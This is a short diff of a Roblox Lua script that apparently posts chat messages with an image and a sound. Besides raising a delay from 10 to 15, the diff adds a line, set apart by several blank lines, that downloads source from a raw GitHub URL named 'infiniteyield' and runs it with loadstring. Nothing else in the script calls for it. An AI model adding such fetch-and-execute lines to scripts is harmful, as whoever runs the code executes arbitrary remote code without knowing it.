@@ -5,7 +5,12 @@ local imageId = "rbxassetid://93669941436109"
 local soundId = "rbxassetid://128037871574654"
 local repeatCount = 3
 local delayBeforeStart = 5
-local delayBetween = 10
+local delayBetween = 15
+
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 
 
 local function sendChatMessage(message)
